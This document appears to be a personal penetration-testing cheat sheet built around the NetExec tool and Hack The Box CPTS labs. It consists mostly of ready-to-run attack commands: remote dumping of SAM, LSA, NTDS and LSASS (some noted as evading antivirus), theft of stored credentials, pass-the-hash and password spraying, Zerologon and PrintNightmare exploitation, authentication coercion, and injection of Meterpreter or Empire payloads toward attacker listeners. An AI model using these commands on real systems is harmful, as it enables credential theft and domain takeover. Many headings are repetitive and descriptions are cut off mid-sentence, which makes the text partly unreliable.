# NetExec (nxc)

% nxc, netexec, smb, ldap, winrm, cpts

## NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - lsa
#cat/RECON #cpts
```
nxc smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa
```

## NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - sam
#cat/RECON #cpts
```
nxc smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam
```

## NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - dumping-sam-remotely
#cat/RECON #cpts
```
netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam
```

## NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - dumping-lsa-remotely
#cat/RECON #cpts
```
netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa
```

## NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - identifying-linked-servers
#cat/RECON #cpts
Voir l'utilisateur de la DB liée

```
nxc mssql <target> -u <user> -p <password>WORD --local-auth -M exec_on_link -o LINKED_SERVER='COMPATIBILITY\POO_CONFIG' COMMAND='select suser_name();'
```

## NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - identifying-linked-servers-2
#cat/RECON #cpts
Voir l'utilisateur que la DB liée à sur notre DB

```
nxc mssql <target> -u <user> -p <password>WORD --local-auth -M exec_on_link -o LINKED_SERVER='COMPATIBILITY\POO_CONFIG' COMMAND="EXEC (''select suser_name();'') at [COMPATIBILITY\POO_PUBLIC]"
```

## NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - enumerating-valid-usernames-with-kerbrute
#cat/RECON #cpts
[Kerbrute](https://github.com/ropnop/kerbrute)

```
netexec smb <ip>
```

## NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - enumerating-valid-usernames-with-kerbrute-2
#cat/RECON #cpts
[Kerbrute](https://github.com/ropnop/kerbrute)

```
./kerbrute_linux_amd64 userenum --dc <ip> --domain <domain> names.txt
```

## NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - enumerating-valid-usernames-with-kerbrute-3
#cat/RECON #cpts
[Kerbrute](https://github.com/ropnop/kerbrute)

```
./kerbrute bruteuser -d ILF.local --dc <ip> /usr/share/wordlists/fasttrack.txt <user>
```

## NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - a-faster-way-to-dump-ntdsdit
#cat/RECON #cpts
```
netexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! -M ntdsutil
```

## NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - nxc
#cat/RECON #cpts
In addition to its many other uses, NetExec can also be used to search through network shares using the --spider option. This functionality is described in great detail on the [official wiki](https://www.netexec.wiki/smb

```
nxc smb <ip> -u <user> -p <password> --spider IT --content --pattern "passw"
```

## NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - nxc-linux
#cat/RECON #cpts
```
netexec smb <ip> -u <user> -d . -H $hash -x whoami
```

## NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - rdp
#cat/RECON #cpts
We can perform an RDP PtH attack to gain GUI access to the target system using tools like xfreerdp. There are a few caveats to this attack: Restricted Admin Mode, which is disabled by default, should be enabled on the ta

```
netexec smb <ip> -u <user> -d . -H $hash -x 'reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f'
```

## NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - netexec
#cat/RECON #cpts
```
nxc smb 172.16.5.5 -u avazquez -p Password123 --pass-pol
```

## NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - nxc-2
#cat/RECON #cpts
```
nxc smb 172.16.5.5 --users
```

## NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - nxc-authenticated
#cat/RECON #cpts
```
sudo nxc smb 172.16.5.5 -u htb-student -p Academy_student_AD! --users
```

## NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - nxc-3
#cat/RECON #cpts
```
sudo nxc smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +
```

## NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - admin-password-reuse
#cat/RECON #cpts
```
sudo nxc smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
```

## NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - domain-user-enumeration
#cat/RECON #cpts
We start by pointing CME at the Domain Controller and using the credentials for the forend user to retrieve a list of all domain users. Notice when it provides us the user information, it includes data points such as the

```
sudo nxc smb 172.16.5.5 -u forend -p Klmcargo2 --users
```

## NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - domain-group-enumeration
#cat/RECON #cpts
We can also obtain a complete listing of domain groups. We should save all of our output to files to easily access it again later for reporting or use with other tools.

```
sudo nxc smb 172.16.5.5 -u forend -p Klmcargo2 --groups
```

## NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - share-searching
#cat/RECON #cpts
We can use the --shares flag to enumerate available shares on the remote host and the level of access our user account has to each share (READ or WRITE access). Let's run this against the INLANEFREIGHT.LOCAL Domain Contr

```
sudo nxc smb 172.16.5.5 -u forend -p Klmcargo2 --shares
```

## NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - spider_plus
#cat/RECON #cpts
```
sudo nxc smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share 'Department Shares'
```

## NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - testing-authentication-against-a-domain-controller
#cat/RECON #cpts
```
sudo nxc smb 172.16.5.5 -u sqldev -p database!
```

## NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - confirming-admin-access-to-the-domain-controller
#cat/RECON #cpts
Finally, we could use the NT hash for the built-in Administrator account to authenticate to the Domain Controller. From here, we have complete control over the domain and could look to establish persistence, search for s

```
[!bash!]$ nxc smb 172.16.5.5 -u administrator -H 88ad09182de639ccc6579eb0849751cf
```

## NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - locating-retrieving-gpp-passwords-with-nxc
#cat/RECON #cpts
Miscellaneous Misconfigurations

```
nxc smb -L | grep gpp
```

## NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - using-nxcs-gpp_autologin-module
#cat/RECON #cpts
Miscellaneous Misconfigurations

```
nxc smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin
```

## NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - esc-8
#cat/RECON #cpts
Finally, we can use `nxc` to coerce the remote machine to authenticate back to us using Kerberos.

```
nxc smb <dc>_HOST -u <user> -p <password>WORD -k -M coerce_plus -o LISTENER=$(DC_HOST)1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA METHOD=PetitPotam
```

## NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - esc-8-2
#cat/RECON #cpts
```
export KRB5CCNAME=$(pwd)/$CERT.ccache
```

## NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - esc-8-3
#cat/RECON #cpts
```
secretsdump.py -k -no-pass cicada.vl/dc-jpq225\$@dcjpq225.cicada.vl -just-dc-user administrator
```

## NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - esc-8-4
#cat/RECON #cpts
```
netexec smb <dc>_HOST -u <user> -k --use-kcache --ntds --user administrator
```

## NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - machine-account-quota
#cat/RECON #cpts
```
nxc ldap DC-JPQ225.cicada.vl -u Rosie.Powell -p Cicada123 -k -M maq
```

## NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - setting-up-a-my-machine-for-a-specific-domain
#cat/RECON #cpts
```
netexec smb DC.voleur.htb -u 'ryan.naylor' -p 'HollowOct31Nyt' -d voleur.htb -k
```

## NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - lsassy
#cat/RECON #cpts
Dumps credentials from LSASS process memory using the [lsassy](https://github.com/Hackndo/lsassy) library. It supports multiple dump methods (procdump, comsvcs, etc.) to avoid common AV/EDR signatures. Extracts NTLM hash

```
nxc smb <target> -u <user> -p <password> -M lsassy
```

## NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - lsassy-2
#cat/RECON #cpts
Dumps credentials from LSASS process memory using the [lsassy](https://github.com/Hackndo/lsassy) library. It supports multiple dump methods (procdump, comsvcs, etc.) to avoid common AV/EDR signatures. Extracts NTLM hash

```
nxc smb <target> -u <user> -p <password> -M lsassy -o METHOD=comsvcs
```

## NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - mimikatz
#cat/RECON #cpts
Uploads and executes Mimikatz on the remote target to dump credentials from LSASS. Supports custom Mimikatz commands via the `COMMAND` option. Highly detected by modern AV/EDR; prefer `lsassy` or `nanodump` in stealth en

```
nxc smb <target> -u <user> -p <password> -M mimikatz
```

## NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - mimikatz-2
#cat/RECON #cpts
Uploads and executes Mimikatz on the remote target to dump credentials from LSASS. Supports custom Mimikatz commands via the `COMMAND` option. Highly detected by modern AV/EDR; prefer `lsassy` or `nanodump` in stealth en

```
nxc smb <target> -u <user> -p <password> -M mimikatz -o COMMAND="sekurlsa::logonpasswords"
```

## NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - nanodump
#cat/RECON #cpts
Uses [nanodump](https://github.com/helpsystems/nanodump) to create a minidump of LSASS with a more evasive approach than traditional dumping tools. Designed to bypass common AV/EDR hooks on `MiniDumpWriteDump`.

```
nxc smb <target> -u <user> -p <password> -M nanodump
```

## NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - handlekatz
#cat/RECON #cpts
Leverages a process handle inherited from a privileged process to dump LSASS memory without directly opening LSASS. A stealthier alternative to standard LSASS dumping techniques.

```
nxc smb <target> -u <user> -p <password> -M handlekatz
```

## NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - procdump
#cat/RECON #cpts
Uses Microsoft's legitimate `procdump.exe` (Sysinternals) to create a memory dump of LSASS. The dump can then be parsed locally with tools like Mimikatz. Being a signed Microsoft binary, it may bypass some controls, thou

```
nxc smb <target> -u <user> -p <password> -M procdump
```

## NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - masky
#cat/RECON #cpts
Dumps credentials using [Masky](https://github.com/Z4kSec/Masky), which abuses ADCS (Active Directory Certificate Services) to request certificates on behalf of logged-in users and then extract the NT hash from those cer

```
nxc smb <target> -u <user> -p <password> -M masky -o CA=<ca_name>
```

## NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - ntdsutil
#cat/RECON #cpts
Safely dumps the NTDS.dit (Active Directory database) using the built-in Windows `ntdsutil.exe` utility, which creates an IFM (Install From Media) snapshot. Less likely to crash the DC compared to VSS-based approaches. T

```
nxc smb <dc> -u <user> -p <password> -M ntdsutil
```

## NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - msol
#cat/RECON #cpts
Targets machines running **Microsoft Entra Connect (formerly Azure AD Connect)** to extract the plaintext credentials of the MSOL synchronization account from the local ADSync database. This account typically has DCSync

```
nxc smb <target> -u <user> -p <password> -M msol
```

## NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - veeam
#cat/RECON #cpts
Extracts credentials stored in **Veeam Backup & Replication** databases (credentials for backup jobs, managed servers, etc.). Veeam often stores admin credentials for large portions of the infrastructure.

```
nxc smb <target> -u <user> -p <password> -M veeam
```

## NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - teams_localdb
#cat/RECON #cpts
Dumps credentials and tokens stored in the local Microsoft Teams SQLite database (`%AppData%\Microsoft\Teams\`). Can yield authentication tokens reusable for Teams/M365 access.

```
nxc smb <target> -u <user> -p <password> -M teams_localdb
```

## NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - gpp_password
#cat/RECON #cpts
Searches SMB shares (particularly `SYSVOL`) for **Group Policy Preference (GPP)** XML files that contain AES-256 encrypted passwords (cPassword). Microsoft published the decryption key, making these trivially crackable.

```
nxc smb <target> -u <user> -p <password> -M gpp_password
```

## NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - gpp_autologin
#cat/RECON #cpts
Searches Group Policy Preference XML files for **autologon credentials** (`DefaultUsername`, `DefaultPassword`, `DefaultDomainName`). These are stored in SYSVOL and readable by all domain users.

```
nxc smb <target> -u <user> -p <password> -M gpp_autologin
```

## NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - keepass_discover
#cat/RECON #cpts
Searches the file system for **KeePass database files** (`.kdbx`) and KeePass configuration files. KeePass databases contain vaulted credentials and are high-value targets.

```
nxc smb <target> -u <user> -p <password> -M keepass_discover
```

## NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - keepass_trigger
#cat/RECON #cpts
Exploits the **KeePass trigger system** (CVE-2023-24055 style) to export the contents of an open KeePass database to a cleartext file. Requires an active KeePass session on the target.

```
nxc smb <target> -u <user> -p <password> -M keepass_trigger -o KEEPASS_CONFIG_PATH=
```

## NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - putty
#cat/RECON #cpts
Searches the Windows registry (`HKCU\Software\SimonTatham\PuTTY\Sessions`) for **PuTTY saved session credentials**, including hostnames, usernames, and stored SSH private key paths.

```
nxc smb <target> -u <user> -p <password> -M putty
```

## NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - winscp
#cat/RECON #cpts
Extracts credentials stored by **WinSCP** from the registry and configuration files. WinSCP can store passwords for FTP/SFTP/SCP sessions using a weak obfuscation scheme.

```
nxc smb <target> -u <user> -p <password> -M winscp
```

## NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - mremoteng
#cat/RECON #cpts
Retrieves saved connection credentials from **mRemoteNG**, a popular multi-protocol remote connection manager. Credentials are stored in `confCons.xml` and encrypted with a (often default) master password.

```
nxc smb <target> -u <user> -p <password> -M mremoteng
```

## NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - filezilla
#cat/RECON #cpts
Searches for plaintext or base64-encoded credentials stored in **FileZilla** client configuration files (`recentservers.xml`, `sitemanager.xml`).

```
nxc smb <target> -u <user> -p <password> -M filezilla
```

## NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - vnc
#cat/RECON #cpts
Retrieves **VNC passwords** stored in the Windows registry by various VNC clients (RealVNC, TightVNC, UltraVNC). These passwords are encrypted with a fixed DES key, making them trivially reversible.

```
nxc smb <target> -u <user> -p <password> -M vnc
```

## NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - wifi
#cat/RECON #cpts
Extracts saved **Wi-Fi profile credentials** (PSKs) from the Windows system using `netsh wlan show profile` and the key material stored by the WLAN service. Useful when targets have laptop users or dual-homed systems wit

```
nxc smb <target> -u <user> -p <password> -M wifi
```

## NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - aws_credentials
#cat/RECON #cpts
Searches for **AWS credentials** files (`~/.aws/credentials`, environment variables, and common configuration locations) on the remote host. Useful when targeting environments that use cloud services.

```
nxc smb <target> -u <user> -p <password> -M aws_credentials
```

## NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - spider_plus-2
#cat/RECON #cpts
Recursively crawls all SMB shares accessible to the authenticated user and builds a JSON index of every file and directory found. Supports downloading files, filtering by extension, and limiting file size. Highly useful

```
nxc smb <target> -u <user> -p <password> -M spider_plus
```

## NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - spider_plus-3
#cat/RECON #cpts
Recursively crawls all SMB shares accessible to the authenticated user and builds a JSON index of every file and directory found. Supports downloading files, filtering by extension, and limiting file size. Highly useful

```
nxc smb <target> -u <user> -p <password> -M spider_plus -o READ_ONLY=false DOWNLOAD_FLAG=true
```

## NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - get_netconnections
#cat/RECON #cpts
Queries active TCP/UDP network connections on the remote host using WMI. Useful for mapping communication patterns, identifying lateral movement paths, or confirming that a host is connected to a sensitive network segmen

```
nxc smb <target> -u <user> -p <password> -M get_netconnections
```

## NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - wcc-windows-configuration-checker
#cat/RECON #cpts
Performs a **local security configuration audit** on the target Windows host, checking settings such as UAC level, Windows Firewall status, LSASS protection (RunAsPPL), LSA protection, WDigest state, screensaver lock, an

```
nxc smb <target> -u <user> -p <password> -M wcc
```

## NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - runasppl
#cat/RECON #cpts
Checks whether **LSASS is running as a Protected Process Light (PPL)**. PPL prevents standard credential dumping tools from reading LSASS memory. The module reads the `RunAsPPL` registry value.

```
nxc smb <target> -u <user> -p <password> -M runasppl
```

## NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - ioxidresolver
#cat/RECON #cpts
Calls the **IOXIDResolver** DCOM interface on the target to enumerate network interfaces and their IP addresses. Useful for discovering additional network interfaces on dual-homed hosts that are not otherwise visible.

```
nxc smb <target> -u <user> -p <password> -M ioxidresolver
```

## NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - webdav
#cat/RECON #cpts
Checks whether the **WebClient service** (WebDAV) is running on the target. An active WebClient service is required for coercion attacks that use UNC paths with HTTP ports (e.g., port 80/443), enabling NTLM relay over HT

```
nxc smb <target> -u <user> -p <password> -M webdav
```

## NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - hyperv-host
#cat/RECON #cpts
Enumerates **Hyper-V virtual machines** running on the target host, listing their names, states (running/stopped), and configuration paths. Useful for mapping virtualized environments.

```
nxc smb <target> -u <user> -p <password> -M hyperv-host
```

## NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - presence
#cat/RECON #cpts
Checks for **tier separation violations** in Active Directory environments, detecting artifacts that suggest admins are breaking the tiered administration model (e.g., Tier 0 accounts logged into Tier 1/2 machines). Help

```
nxc smb <target> -u <user> -p <password> -M presence
```

## NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - impersonate
#cat/RECON #cpts
Lists available **user tokens** on the target machine that can be impersonated. Uses Windows token impersonation APIs to identify which security contexts are available for privilege escalation (similar to Incognito/Meter

```
nxc smb <target> -u <user> -p <password> -M impersonate
```

## NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - install_elevated
#cat/RECON #cpts
Checks the `AlwaysInstallElevated` registry keys in both `HKLM` and `HKCU`. If both are set to `1`, any user can install MSI packages with SYSTEM privileges — a classic local privilege escalation path.

```
nxc smb <target> -u <user> -p <password> -M install_elevated
```

## NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - gpo_admins_privs
#cat/RECON #cpts
Extracts **GPO-deployed privilege assignments** from Group Policy Objects, showing which accounts have been granted elevated rights (e.g., "Debug programs", "Act as part of the operating system") through policy. Helps id

```
nxc smb <target> -u <user> -p <password> -M gpo_admins_privs
```

## NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - zerologon
#cat/RECON #cpts
Checks for (and can exploit) **CVE-2020-1472 (Zerologon)**, a critical vulnerability in the Netlogon protocol that allows an unauthenticated attacker to reset the machine account password of a Domain Controller, effectiv

```
nxc smb <dc> -u '' -p '' -M zerologon
```

## NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - nopac
#cat/RECON #cpts
Checks for **CVE-2021-42278 / CVE-2021-42287 (NoPac / Sam The Admin)**, a vulnerability that allows any domain user to escalate to Domain Admin by manipulating the `sAMAccountName` attribute of a machine account and abus

```
nxc smb <dc> -u <user> -p <password> -M nopac
```

## NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - ms17-010
#cat/RECON #cpts
Checks whether the target is vulnerable to **EternalBlue (MS17-010)**, the NSA exploit made public by Shadow Brokers. This vulnerability affects older Windows systems (XP through Server 2008 R2) and allows unauthenticate

```
nxc smb <target> -u '' -p '' -M ms17-010
```

## NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - printnightmare
#cat/RECON #cpts
Checks for or exploits **PrintNightmare (CVE-2021-1675 / CVE-2021-34527)**, a vulnerability in the Windows Print Spooler service. Allows remote code execution or local privilege escalation by loading a malicious DLL as a

```
nxc smb <target> -u <user> -p <password> -M printnightmare -o DLL_PATH=\\<target>\share\evil.dll
```

## NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - drop-sc
#cat/RECON #cpts
Places a malicious **Shell Command File** (`.scf`) or similar file in an accessible SMB share that, when browsed by a victim, triggers an automatic authentication attempt to an attacker-controlled server. Useful for capt

```
nxc smb <target> -u <user> -p <password> -M drop-sc -o URL=\\<lhost>\share SHARE=
```

## NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - slinky
#cat/RECON #cpts
Creates a malicious **Windows shortcut (`.lnk`)** file on a writable SMB share. When a victim browses the share in Explorer, Windows automatically resolves the LNK target, triggering an NTLM authentication request to an

```
nxc smb <target> -u <user> -p <password> -M slinky -o SERVER= NAME=
```

## NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - rdp-2
#cat/RECON #cpts
Enables or disables **Remote Desktop Protocol (RDP)** on the target host by modifying registry keys and firewall rules. Useful for establishing persistent remote GUI access.

```
nxc smb <target> -u <user> -p <password> -M rdp -o ACTION=enable
```

## NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - rdp-3
#cat/RECON #cpts
Enables or disables **Remote Desktop Protocol (RDP)** on the target host by modifying registry keys and firewall rules. Useful for establishing persistent remote GUI access.

```
nxc smb <target> -u <user> -p <password> -M rdp -o ACTION=disable
```

## NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - wdigest
#cat/RECON #cpts
Enables or disables **WDigest authentication** by modifying the `UseLogonCredential` registry key. When WDigest is enabled, Windows caches credentials in cleartext in LSASS memory, making them retrievable by Mimikatz.

```
nxc smb <target> -u <user> -p <password> -M wdigest -o ACTION=enable
```

## NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - wdigest-2
#cat/RECON #cpts
Enables or disables **WDigest authentication** by modifying the `UseLogonCredential` registry key. When WDigest is enabled, Windows caches credentials in cleartext in LSASS memory, making them retrievable by Mimikatz.

```
nxc smb <target> -u <user> -p <password> -M wdigest -o ACTION=disable
```

## NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - empire_exec
#cat/RECON #cpts
Triggers a **PowerShell Empire** agent by interacting with the Empire REST API and executing an appropriate stager on the target. Requires a running Empire instance with an active HTTP listener.

```
nxc smb <target> -u <user> -p <password> -M empire_exec -o LISTENER=
```

## NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - met_inject
#cat/RECON #cpts
Injects a **Meterpreter** shellcode payload into a running process on the target. Requires a configured Metasploit multi/handler listener.

```
nxc smb <target> -u <user> -p <password> -M met_inject -o LHOST= LPORT=
```

## NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - petitpotam
#cat/RECON #cpts
Exploits **PetitPotam (CVE-2021-36942)**, a technique that abuses the MS-EFSRPC (Encrypting File System Remote Protocol) to coerce a target host's machine account into authenticating to an arbitrary server via NTLM. High

```
nxc smb <target> -u <user> -p <password> -M petitpotam -o LISTENER=
```

## NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - dfscoerce
#cat/RECON #cpts
Exploits **DFSCoerce**, an authentication coercion technique abusing the MS-DFSNM (Distributed File System Namespace Management) protocol. Similar effect to PetitPotam — forces the target to authenticate outbound.

```
nxc smb <target> -u <user> -p <password> -M dfscoerce -o LISTENER=
```

## NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - printerbug
#cat/RECON #cpts
Exploits the **SpoolSample / PrinterBug** technique, abusing the MS-RPRN (Print System Remote Protocol) to coerce a target into authenticating to an attacker-controlled server. One of the earliest widely-used coercion te

```
nxc smb <target> -u <user> -p <password> -M printerbug -o LISTENER=
```

## NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - shadowcoerce
#cat/RECON #cpts
Exploits **ShadowCoerce**, which abuses the MS-FSRVP (File Server Remote VSS Protocol) to trigger outbound NTLM authentication from the target. Works on file servers with the File Server VSS Agent Service enabled.

```
nxc smb <target> -u <user> -p <password> -M shadowcoerce -o LISTENER=
```

## NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - efsr_spray
#cat/RECON #cpts
Performs a **spray of EFS-based coercion requests** across multiple targets. Combines the EFS coercion approach with broader target coverage, useful when scanning an entire subnet for coerceable hosts.

```
nxc smb <file> -u <user> -p <password> -M efsr_spray -o LISTENER=
```

## NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - coerce_plus
#cat/RECON #cpts
An all-in-one coercion module that attempts **multiple coercion techniques** (MS-RPRN, MS-EFSRPC, MS-DFSNM, MS-FSRVP, etc.) in sequence against the target until one succeeds. Useful when the specific protocol available o

```
nxc smb <target> -u <user> -p <password> -M coerce_plus -o LISTENER=
```

## NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - laps
#cat/RECON #cpts
Retrieves **LAPS (Local Administrator Password Solution)** managed passwords for domain-joined computers. Reads the `ms-MCS-AdmPwd` attribute (legacy LAPS) or `msLAPS-Password` / `msLAPS-EncryptedPassword` (Windows LAPS)

```
nxc ldap <dc> -u <user> -p <password> -M laps
```

## NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - laps-2
#cat/RECON #cpts
Retrieves **LAPS (Local Administrator Password Solution)** managed passwords for domain-joined computers. Reads the `ms-MCS-AdmPwd` attribute (legacy LAPS) or `msLAPS-Password` / `msLAPS-EncryptedPassword` (Windows LAPS)

```
nxc ldap <dc> -u <user> -p <password> -M laps -o COMPUTER=
```

## NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - daclread
#cat/RECON #cpts
Reads and interprets **Discretionary Access Control Lists (DACLs)** for any AD object. Can display all ACEs on a target, filter by rights (e.g., DCSync, GenericAll, WriteDACL), or search for all principals with a specifi

```
nxc ldap <dc> -u <user> -p <password> -M daclread -o TARGET=Administrator ACTION=read
```

## NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - daclread-2
#cat/RECON #cpts
Reads and interprets **Discretionary Access Control Lists (DACLs)** for any AD object. Can display all ACEs on a target, filter by rights (e.g., DCSync, GenericAll, WriteDACL), or search for all principals with a specifi

```
nxc ldap <dc> -u <user> -p <password> -M daclread -o TARGET_DN="DC=domain,DC=local" ACTION=read RIGHTS=DCSync
```

## NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - ldap-checker
#cat/RECON #cpts
Checks the **LDAP signing and channel binding** requirements configured on Domain Controllers. LDAP signing should be enforced to prevent relay attacks; this module helps identify misconfigurations. Results are now also

```
nxc ldap <dc> -u <user> -p <password> -M ldap-checker
```

## NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - get-desc-users
#cat/RECON #cpts
Reads the **description attribute** of all user accounts in Active Directory. Administrators often store sensitive information (including passwords) in user description fields, which are readable by any authenticated dom

```
nxc ldap <dc> -u <user> -p <password> -M get-desc-users
```

## NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - maq
#cat/RECON #cpts
Reads the **MachineAccountQuota (MAQ)** attribute from AD, which defines how many machine accounts a regular domain user can create. A non-zero MAQ (default is 10) is required for resource-based constrained delegation (R

```
nxc ldap <dc> -u <user> -p <password> -M maq
```

## NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - pre2k
#cat/RECON #cpts
Enumerates **pre-Windows 2000 compatible computer accounts** in the domain. These accounts can often be authenticated against with just the machine name as the password (e.g., `HOSTNAME$` / `hostname`), as the password i

```
nxc ldap <dc> -u <user> -p <password> -M pre2k
```

## NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - adcs
#cat/RECON #cpts
Enumerates **Active Directory Certificate Services (ADCS)** infrastructure — Certificate Authorities, certificate templates, and their configurations. Helps identify misconfigured templates vulnerable to ESC1–ESC8 attack

```
nxc ldap <dc> -u <user> -p <password> -M adcs
```

## NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - pso
#cat/RECON #cpts
Retrieves **Password Settings Objects (PSOs)** from the AD directory. PSOs define fine-grained password policies applied to specific groups or users, potentially revealing weaker password policies for privileged accounts

```
nxc ldap <dc> -u <user> -p <password> -M pso
```

## NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - subnets
#cat/RECON #cpts
